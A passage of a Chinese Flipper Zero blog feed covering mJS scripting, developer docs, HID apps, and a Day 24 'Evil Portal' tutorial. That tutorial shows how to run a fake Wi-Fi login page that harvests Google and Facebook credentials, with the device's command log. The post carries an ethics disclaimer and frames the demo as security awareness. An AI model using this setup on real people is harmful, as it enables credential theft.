class="line">widget.<span class="title function_">addText</span>(<span class="number">10</span>, <span class="number">10</span>, <span class="string">&quot;Primary&quot;</span>, <span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// This line is optional; it keeps the widget open for 10 seconds.</span></span><br><span class="line"><span class="title function_">delay</span>(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Close the widget after showing the message.</span></span><br><span class="line">widget.<span class="title function_">close</span>();</span><br></pre></td></tr></table></figure></div><p>執行結果：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/hello_from_flipper.png"                      alt="hello"                ></p><p>成功！！<br>接著我們給他新任務，試著讀入使用者輸入：<br>mission: can you prompt for the name of the person then print “Hello <name>!”</p><p>GPT 4o:</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> widget = <span class="built_in">require</span>(<span class="string">&quot;widget&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> keyboard = <span class="built_in">require</span>(<span class="string">&quot;keyboard&quot;</span>);</span><br><span class="line"></span><br><span class="line">widget.<span class="title function_">show</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Display on-screen keyboard to get user input</span></span><br><span class="line"><span class="keyword">let</span> name = keyboard.<span class="title function_">text</span>(<span class="string">&quot;Enter your name&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Display the &quot;Hello &lt;name&gt;!&quot; message on the screen</span></span><br><span class="line">widget.<span class="title function_">addText</span>(<span class="number">10</span>, <span class="number">10</span>, <span class="string">&quot;Primary&quot;</span>, <span class="string">&quot;Hello &quot;</span> + name + <span class="string">&quot;!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Keep the widget open for 10 seconds</span></span><br><span class="line"><span class="title function_">delay</span>(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Close the widget after showing the message</span></span><br><span class="line">widget.<span class="title function_">close</span>();</span><br></pre></td></tr></table></figure></div><p>結果如下：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/error.png"                      alt="error"                ></p><p>結果大概重新試了十次還是一直遇到錯誤，好爛QQ<br>接著我們試著讓他寫一個 BasUSB 的腳本讓他去測試十個最常見的四位數 pin 碼：<br>結果是他還是會寫出許多錯誤，需要我們跟 GPT 來回 debug 3 ~ 5 次才會成功。</p><h2 id="按讚訂閱收藏小鈴噹叮叮叮"><a href="#按讚訂閱收藏小鈴噹叮叮叮" class="headerlink" title="按讚訂閱收藏小鈴噹叮叮叮"></a>按讚訂閱收藏小鈴噹叮叮叮</h2><p>結論是 mJS 沒有想像中的方便，因為他其實不像是我們常用的 JS，如果透過 AI 協助的話確實會比較有效率，但還是需要先訓練而且經過多次 Debug 才有機會拿到可以執行的腳本。<br>今天的介紹就到這邊，這幾天準備開始寫 Flipper 的 APP 不知道大家有沒有什麼有趣的想法，歡迎留言告訴我。<br>明天見！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在今年 9 月 10 號的時候，我看到 Flipper 官網發了一篇部落格是關於他們的韌體終於進入 1.0 版本了，也列出目前的版有的標誌性</summary>
      
    
    
    
    
    <category term="flipper-zero" scheme="https://kazma.tw/tags/flipper-zero/"/>
    
    <category term="iThome" scheme="https://kazma.tw/tags/iThome/"/>
    
    <category term="toy" scheme="https://kazma.tw/tags/toy/"/>
    
  </entry>
  
  <entry>
    <title>Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day24 - 釣魚～釣魚～釣到什麼魚？釣到 Evil Portal 的釣魚藝術攻擊！</title>
    <link href="https://kazma.tw/2024/10/08/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day24/"/>
    <id>https://kazma.tw/2024/10/08/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day24/</id>
    <published>2024-10-08T14:21:27.383Z</published>
    <updated>2024-10-27T09:33:24.727Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Evil-Portal"><a href="#Evil-Portal" class="headerlink" title="Evil Portal"></a>Evil Portal</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://bnetcmsus-a.akamaihd.net/cms/content_folder_media/RHAVK2UNJT0J1692206252452.png"                      alt="cover"                ><br>圖片來源：<a class="link"   href="https://hearthstone.blizzard.com/zh-tw/news/23987537/27-2" >https://hearthstone.blizzard.com/zh-tw/news/23987537/27-2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><blockquote><p>爐石戰記的英雄戰場模式裡的七星魚人卡，因為很容易用釣竿飾品抽到所以聯想到XD</p></blockquote><h2 id="資安倫理宣導"><a href="#資安倫理宣導" class="headerlink" title="資安倫理宣導"></a>資安倫理宣導</h2><p>請注意，透過 Flipper Zero 學習的資訊技術與知識，目的在於提升個人的技術能力和資安意識。我們強烈呼籲大家，絕對不要使用所學知識從事任何違法行為。您的合法使用是我們的期望，也是您自身責任的<br>一部分。</p><h2 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h2><p>嗨我是 Kazma。<br>今天要介紹 WiFi 開發板的一個應用叫做 Evil Portal，他是一種網路釣魚攻擊技術。我們可以透過創建一個假的 WiFi 登入介面讓受害者去輸入自己的重要帳密像是 google 或是 facebook 帳密等，尤其是我們到咖啡廳的時候通常會去使用咖啡廳的無線網路，這時如果駭客故意取了跟咖啡廳網路同樣的名稱，而且沒有密碼限制的話，肯定會有不少人上鉤的。<br>今天我們就來實作看看這個技術，來了解他有多麽危險吧。</p><h2 id="Evil-Portal-實作"><a href="#Evil-Portal-實作" class="headerlink" title="Evil Portal 實作"></a>Evil Portal 實作</h2><p>首先我們可以到 Menu -&gt; Apps -&gt; GPIO -&gt; ESP -&gt; Evil Portal，點進去之後可以看到許多設定包含開始跟停止，設定 ap 的名字，選擇 html 檔案。<br>接著我在網路上找到有人製作了許多不同的登入介面，網址如下：<br><a class="link"   href="https://github.com/bigbrodude6119/flipper-zero-evil-portal/tree/main/portals" >https://github.com/bigbrodude6119/flipper-zero-evil-portal/tree/main/portals <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>我們把他載下來然後把 html 上傳到 evil portal 的資料夾下面。<br>位置在 <code>apps_data/evil_portal/html</code> 然後我們像是 facebook 跟 google 的畫面長得像是下面這樣：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/google_login.jpg"                      alt="google"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/facebook_login.jpg"                      alt="facebook"                ><br>然後當有人輸入帳密之後就會看到 Flipper 上收到他的帳密：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/evil_pass.png"                      alt="pass"                ><br>或是我們按下 saved logs 之後可以到 qFlipper 的 <code>apps_data/evil_portal/logs/</code> 可以看到剛剛的紀錄：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">#setap=Kazma Free-WiFi</span><br><span class="line">&gt; #clearlist -a -s -c</span><br><span class="line">access_points: 0</span><br><span class="line">stations: 0</span><br><span class="line">ssids: 0</span><br><span class="line">stations: 0</span><br><span class="line">&gt; #ssid -a -n &#x27;Kazma Free-WiFi&#x27;</span><br><span class="line">Kazma Free-WiFi</span><br><span class="line">&gt; #evilportal -c sethtmlstr</span><br><span class="line">Setting HTML from serial...</span><br><span class="line">html set</span><br><span class="line">&gt; #evilportal -c start</span><br><span class="line">Starting Evil Portal. Stop with stopscan</span><br><span class="line">AP name from SSID list: Kazma Free-WiFi</span><br><span class="line">ap config set</span><br><span class="line">html previously set</span><br><span class="line">starting ap Kazma Free-WiFi</span><br><span class="line">ap ip address: 172.0.0.1</span><br><span class="line">web server up</span><br><span class="line">&gt; u: kazmatw@gmail.com p: 123456789</span><br><span class="line">client connected</span><br><span class="line">#setap=Kazma Free-WiFi</span><br><span class="line">&gt; #clearlist -a -s -c</span><br><span class="line">access_points: 0</span><br><span class="line">stations: 0</span><br><span class="line">ssids: 0</span><br><span class="line">stations: 0</span><br><span class="line">&gt; #ssid -a -n &#x27;Kazma Free-WiFi&#x27;</span><br><span class="line">Kazma Free-WiFi</span><br><span class="line">&gt; #evilportal -c sethtmlstr</span><br><span class="line">&gt; #setap=Kazma Free-WiFi</span><br><span class="line">&gt; #clearlist -a -s -c</span><br><span class="line">access_points: 0</span><br><span class="line">stations: 0</span><br><span class="line">ssids: 0</span><br><span class="line">stations: 0</span><br><span class="line">&gt; #ssid -a -n &#x27;Kazma Free-WiFi&#x27;</span><br><span class="line">Kazma Free-WiFi</span><br><span class="line">&gt; #evilportal -c sethtmlstr</span><br><span class="line">Setting HTML from serial...</span><br><span class="line">html set</span><br><span class="line">&gt; #evilportal -c start</span><br><span class="line">Starting Evil Portal. Stop with stopscan</span><br><span class="line">AP name from SSID list: Kazma Free-WiFi</span><br><span class="line">ap config set</span><br><span class="line">html previously set</span><br><span class="line">starting ap Kazma Free-WiFi</span><br><span class="line">ap ip address: 172.0.0.1</span><br><span class="line">web server up</span><br><span class="line">&gt; u: kazmatw@gmail.com p: 123456</span><br><span class="line">client connected</span><br></pre></td></tr></table></figure></div><p>類似像是上面這樣，然後我有先透過 Set AP name 改過名字變成 <code>Kazma Free-WiFi</code> 了。</p><h2 id="按讚訂閱收藏小鈴噹叮叮叮"><a href="#按讚訂閱收藏小鈴噹叮叮叮" class="headerlink" title="按讚訂閱收藏小鈴噹叮叮叮"></a>按讚訂閱收藏小鈴噹叮叮叮</h2><p>當然我們也可以自己寫其他的 html 來放上去或是發揮創意去做其他的應用，大家有什麼有趣的用法也歡迎跟我分享。大概就是這樣，各位明天見！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Evil-Portal&quot;&gt;&lt;a href=&quot;#Evil-Portal&quot; class=&quot;headerlink&quot; title=&quot;Evil Portal&quot;&gt;&lt;/a&gt;Evil Portal&lt;/h2&gt;&lt;p&gt;&lt;img  
                     lazylo</summary>
      
    
    
    
    
    <category term="flipper-zero" scheme="https://kazma.tw/tags/flipper-zero/"/>
    
    <category term="iThome" scheme="https://kazma.tw/tags/iThome/"/>
    
    <category term="toy" scheme="https://kazma.tw/tags/toy/"/>
    
  </entry>
  
  <entry>
    <title>Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day23 - 登峰造極：Flipper Zero 從業餘玩家到開發人員的成長之路</title>
    <link href="https://kazma.tw/2024/10/07/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day23/"/>
    <id>https://kazma.tw/2024/10/07/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day23/</id>
    <published>2024-10-07T09:11:01.865Z</published>
    <updated>2024-10-27T09:32:58.722Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Development"><a href="#Development" class="headerlink" title="Development"></a>Development</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://images.archbee.com/3StCFqarJkJQZV-7N79yY/S0IwQX9eTbVfNm3A7XVQF_command-lineinterface7-1.png?format=webp&width=1280"                      alt="dev"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/development/cli" >https://docs.flipper.net/development/cli <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>嗨，這裡是 Kazma。<br>在昨天的最後有介紹到 Flipper 有許多社群開發的韌體和應用程式，所以今天要來跟大家介紹關於 Flipper 開發方面的官方文件。</p><h2 id="資安倫理宣導"><a href="#資安倫理宣導" class="headerlink" title="資安倫理宣導"></a>資安倫理宣導</h2><p>請注意，透過 Flipper Zero 學習的資訊技術與知識，目的在於提升個人的技術能力和資安意識。我們強烈呼籲大家，絕對不要使用所學知識從事任何違法行為。您的合法使用是我們的期望，也是您自身責任的一部分。</p><h2 id="開發說明"><a href="#開發說明" class="headerlink" title="開發說明"></a>開發說明</h2><p>首先 Flipper 的官方文件關於開發分成四個部分，分別是：</p><ul><li>Firmware</li><li>Hardware</li><li>Blueprints</li><li>Command-line interface</li></ul><p>我們就依序來介紹這四個部分吧。</p><h2 id="Firmware"><a href="#Firmware" class="headerlink" title="Firmware"></a>Firmware</h2><p>Flipper Zero Firmware Developer Documentation:<br><a class="link"   href="https://developer.flipper.net/flipperzero/doxygen/" >https://developer.flipper.net/flipperzero/doxygen/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>這份是專門給想要參與開發的開發人員文件，主要分成幾個部分：</p><ul><li>Application Programming - Writing applications for Flipper Zero</li><li>System Programming - Understanding the firmware’s internals</li><li>File Formats - Saving and loading data to and from files</li><li>Developer Tools - Hardware and software tools for all kinds of programming</li><li>Expansion Modules - Additional modules to expand Flipper’s consciousness</li><li>Miscellaneous - Various useful pieces of information</li><li>JavaScript - JS-based scripting engine documentation</li></ul><p>還有一些自動產生的介紹：</p><ul><li>Data Structures - Every data structure in a list</li><li>Files - Source file tree with easy navigation</li></ul><p>有時間的話，希望能在最後幾天寫一個簡單的 app。</p><h2 id="Hardware"><a href="#Hardware" class="headerlink" title="Hardware"></a>Hardware</h2><p>主要分成以下幾個部分：</p><ul><li>Wi-Fi Developer Board - First start, debugging, and schematics</li><li>Flipper Zero tech specs - Technical specifications for Flipper Zero hardware</li><li>Flipper Zero schematics and PCBs - Downloadable schematics and PCB drawings</li><li>ST-Link V3 Developer Board - Schematics and specifications</li><li>External modules - 3D models and drawings for external module development</li></ul><h2 id="Blueprints"><a href="#Blueprints" class="headerlink" title="Blueprints"></a>Blueprints</h2><p>這部分包含 Flipper 的一些設計圖：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.flipperzero.one/Monosnap_flipper-zero-body-2d.pdf_2022-09-13_13-14-57.png"                      alt="blue"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/development/blueprints/flipper-zero" >https://docs.flipper.net/development/blueprints/flipper-zero <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>以及一些 3D 模型：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.flipperzero.one/Monosnap_Autodesk_Viewer__Free_Online_File_Viewer_2022-09-13_13-18-18.png"                      alt="3d"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/development/blueprints/flipper-zero" >https://docs.flipper.net/development/blueprints/flipper-zero <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="Command-line-interface"><a href="#Command-line-interface" class="headerlink" title="Command-line interface"></a>Command-line interface</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://images.archbee.com/3StCFqarJkJQZV-7N79yY/S0IwQX9eTbVfNm3A7XVQF_command-lineinterface7-1.png?format=webp&width=1280"                      alt="cli"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/development/cli" >https://docs.flipper.net/development/cli <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>我們可以透過 CLI 控制，可以做到很多被 GUI 限制的功能，我們就來介紹一下這塊：</p><h3 id="Accessing-the-Flipper-Zero-CLI"><a href="#Accessing-the-Flipper-Zero-CLI" class="headerlink" title="Accessing the Flipper Zero CLI"></a>Accessing the Flipper Zero CLI</h3><p>主要有三種方式，我們依序介紹：</p><h4 id="Method-1-Using-Flipper-Lab"><a href="#Method-1-Using-Flipper-Lab" class="headerlink" title="Method 1: Using Flipper Lab"></a>Method 1: Using Flipper Lab</h4><p>在 <a class="link"   href="https://lab.flipper.net/" >https://lab.flipper.net/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 用 USB-C 連上電腦後可以使用 CLI 功能：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://images.archbee.com/3StCFqarJkJQZV-7N79yY/6Ta2VxsToLXvHRycbu2gA_monosnap-miro-2023-11-10-19-15-33.jpg?format=webp&width=1280"                      alt="CLI"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/development/cli" >https://docs.flipper.net/development/cli <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h4 id="Method-2-Using-the-web-serial-terminal"><a href="#Method-2-Using-the-web-serial-terminal" class="headerlink" title="Method 2: Using the web serial terminal"></a>Method 2: Using the web serial terminal</h4><p>一樣先接電腦，然後到 <a class="link"   href="https://googlechromelabs.github.io/serial-terminal/" >https://googlechromelabs.github.io/serial-terminal/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 設定 Baud rate 為 230400 然後點選 Connect<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://images.archbee.com/3StCFqarJkJQZV-7N79yY/sye_T_-Tw5qPxcUFho9xi_monosnap-miro-2023-11-21-15-49-37.jpg?format=webp&width=1280"                      alt="web"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/development/cli" >https://docs.flipper.net/development/cli <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h4 id="Method-3-Using-a-serial-terminal"><a href="#Method-3-Using-a-serial-terminal" class="headerlink" title="Method 3: Using a serial terminal"></a>Method 3: Using a serial terminal</h4><p>根據不同作業系統有不同方式，這邊拿 mac 舉例，順便附一下這部分的官網教學：<br><a class="link"   href="https://docs.flipper.net/development/cli#rnDLl" >https://docs.flipper.net/development/cli#rnDLl <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><ol><li>首先打開我 mac 常用的 terminal iTerm2</li><li>執行 <code>ls /dev/cu.*</code></li><li>然後找 <code>/dev/cu.usbmodemflip_NAME</code> NAME 是我們 flipper 的名字</li><li>執行 <code>screen  /dev/cu.usbmodemflip_NAME</code> 就可以進去了</li><li>離開的話 control-a(prefix) 然後 k(kill) 最後選 y(yes)</li></ol><h3 id="Available-commands"><a href="#Available-commands" class="headerlink" title="Available commands"></a>Available commands</h3><p>進去之後我們可以透過輸入 <code>?</code> 或是 <code>help</code> 來顯示可以執行的指令<br>詳細指令大家可以參考官網。</p><h3 id="Reading-Flipper-Zero-logs-via-the-CLI"><a href="#Reading-Flipper-Zero-logs-via-the-CLI" class="headerlink" title="Reading Flipper Zero logs via the CLI"></a>Reading Flipper Zero logs via the CLI</h3><p>我們可以透過 CLI 來看 logs，透過輸入 <code>log ?</code> 來看更多相關指令：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;: log ?</span><br><span class="line">&lt;log&gt; — start logging using the current level from the system settings</span><br><span class="line">&lt;log error&gt; — only critical errors and other important messages</span><br><span class="line">&lt;log warn&gt; — non-critical errors and warnings including &lt;log error&gt;</span><br><span class="line">&lt;log info&gt; — non-critical information including &lt;log warn&gt;</span><br><span class="line">&lt;log default&gt; — the default system log level (equivalent to &lt;log info&gt;)</span><br><span class="line">&lt;log debug&gt; — debug information including &lt;log info&gt; (may impact system performance)</span><br><span class="line">&lt;log trace&gt; — system traces including &lt;log debug&gt; (may impact system performance)</span><br></pre></td></tr></table></figure></div><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://images.archbee.com/3StCFqarJkJQZV-7N79yY/OoX4AHOGthXpUsyZwRDON_monosnap-miro-2023-11-20-14-15-54.jpg?format=webp&width=1280"                      alt="log"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/development/cli#rnDLl" >https://docs.flipper.net/development/cli#rnDLl <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="Chatting-with-other-Flipper-Zero-users"><a href="#Chatting-with-other-Flipper-Zero-users" class="headerlink" title="Chatting with other Flipper Zero users"></a>Chatting with other Flipper Zero users</h3><p>一樣先接線之後進到 CLI。<br>執行 <code>subghz chat &lt;frequency in Hz&gt; &lt;device:0/1&gt;</code><br>例如 <code>subghz chat 868150000 0</code><br>然後輸入訊息之後 return ：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://images.archbee.com/3StCFqarJkJQZV-7N79yY/hIHZMiH5Z93LzhZYl_c4v_monosnap-flipper-lab-2023-11-20-15-45-18.jpg?format=webp&width=1280"                      alt="chat"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/development/cli#rnDLl" >https://docs.flipper.net/development/cli#rnDLl <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>就可以跟附近同一個頻率的人對話了。</p><h2 id="按讚訂閱收藏小鈴噹叮叮叮"><a href="#按讚訂閱收藏小鈴噹叮叮叮" class="headerlink" title="按讚訂閱收藏小鈴噹叮叮叮"></a>按讚訂閱收藏小鈴噹叮叮叮</h2><p>OK 今天跟各位講了開發人員可以如何去貢獻到 Flipper 社群，也快速帶過了 Flipper CLI 的功能，希望最後有時間可以寫一個簡單的 app，那今天大概就到這邊，各位明天見了！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Development&quot;&gt;&lt;a href=&quot;#Development&quot; class=&quot;headerlink&quot; title=&quot;Development&quot;&gt;&lt;/a&gt;Development&lt;/h2&gt;&lt;p&gt;&lt;img  
                     lazylo</summary>
      
    
    
    
    
    <category term="flipper-zero" scheme="https://kazma.tw/tags/flipper-zero/"/>
    
    <category term="iThome" scheme="https://kazma.tw/tags/iThome/"/>
    
    <category term="toy" scheme="https://kazma.tw/tags/toy/"/>
    
  </entry>
  
  <entry>
    <title>Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day 22 - 速度與激情：Flipper 快到連加藤鷹都嫉妒的金手指！</title>
    <link href="https://kazma.tw/2024/10/06/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day22/"/>
    <id>https://kazma.tw/2024/10/06/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day22/</id>
    <published>2024-10-06T10:37:11.073Z</published>
    <updated>2024-10-27T09:32:30.278Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Apps"><a href="#Apps" class="headerlink" title="Apps"></a>Apps</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://images.archbee.com/3StCFqarJkJQZV-7N79yY/8-cD0PKRkRzTj-ecbVtxQ_apps3-1.png?format=webp&width=1280"                      alt="cover"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/apps" >https://docs.flipper.net/apps <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天插播介紹一下 Flipper 內建的 Apps 目錄，也是在 Menu 下面的。<br>包含許多社群開發的工具和遊戲，，我們可以透過 Flipper Mobile App 跟 Flipper Lab 下載跟管理這些應用程式。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://images.archbee.com/3StCFqarJkJQZV-7N79yY/4jn9iTtSOi5ptpBeGnPib_flipper-zero-apps-mobile-and-desktop-1.png?format=webp&width=1280"                      alt="way"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/apps" >https://docs.flipper.net/apps <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>其中也包含許多不同的類別：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://images.archbee.com/3StCFqarJkJQZV-7N79yY/ot_oGZZwJvUKLRyWO9DAQ_monosnap-miro-2023-07-06-17-53-55.jpg?format=webp&width=1280"                      alt="tag"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/apps" >https://docs.flipper.net/apps <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>今天就來介紹一下其中有什麼有趣的吧。</p><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>今天開始要來介紹大家最常購買的配件之一 Wifi 開發板以及他的一些應用，如果大家預算足夠的話，也建議各位買一塊來玩玩，如果對硬體比較熟悉的朋友們也可以嘗試去其他的地方買材料來自己做各種功能的板子，或是不知道官方的板板有什麼可以玩的話，那不妨就先來看看我這幾天的介紹吧～</p><h2 id="HID-controllers"><a href="#HID-controllers" class="headerlink" title="HID controllers"></a>HID controllers</h2><p>今天要介紹這個特別被 Flipper 拿出來介紹的額外應用程式。<br>他允許我們將 Flipper 作為人機介面裝置（HID）控制器，可以跟我們的電腦手機互動，也可以遠端控制投影片、模擬鍵盤、控制電腦上的媒體播放器、模擬鼠標等，都是可以做到的。</p><h3 id="Pairing-Flipper-Zero-as-a-remote"><a href="#Pairing-Flipper-Zero-as-a-remote" class="headerlink" title="Pairing Flipper Zero as a remote"></a>Pairing Flipper Zero as a remote</h3><p>我們可以透過 Bluetooth Low Energy (LE) 或是 USB-C 跟目標裝置連接。<br>藍芽配對大家應該都會了，值得一提的是如果我們要取消配對所有以配對的裝置的話，我們可以到 Main Menu -&gt; Apps -&gt; Bluetooth -&gt; Remote 然後選 Remove Pairing，如下：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://images.archbee.com/3StCFqarJkJQZV-7N79yY/gzL-BVbBKS8EA-KWCMnNQ_monosnap-miro-2023-12-08-19-53-39.jpg?format=webp&width=1280"                      alt="remove pairing"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/apps" >https://docs.flipper.net/apps <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="Controlling-presentations"><a href="#Controlling-presentations" class="headerlink" title="Controlling presentations"></a>Controlling presentations</h3><p>我們可以透過到 Main Menu -&gt; Apps -&gt; Bluetooth -&gt; Remote -&gt; Keynote 可以看到以下的畫面：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://images.archbee.com/3StCFqarJkJQZV-7N79yY/tkGXctIell-2EI264LyCR_monosnap-miro-2023-08-07-14-45-14.jpg?format=webp&width=1280"                      alt="keynote"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/apps" >https://docs.flipper.net/apps <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>跟平常操作投影片一樣，左跟上都是上一頁，右跟下還有空白鍵是下一頁，返回會離開投影模式，然後也可以變成直式的，我們選 Keynote Vertical：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://images.archbee.com/3StCFqarJkJQZV-7N79yY/lA9EFGShpLiJtH1Vp_pBM_monosnap-miro-2023-08-07-14-47-35.jpg?format=webp&width=1280"                      alt="vertical"                ><br>圖片來源：<a class="link"   href="https://docs.flipper.net/apps" >https://docs.flipper.net/apps <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="Emulating-a-keyboard"><a href="#Emulating-a-keyboard" class="headerlink" title="Emulating a keyboard"></a>Emulating a keyboard</h3><p>我們也可以透過 Keyboard 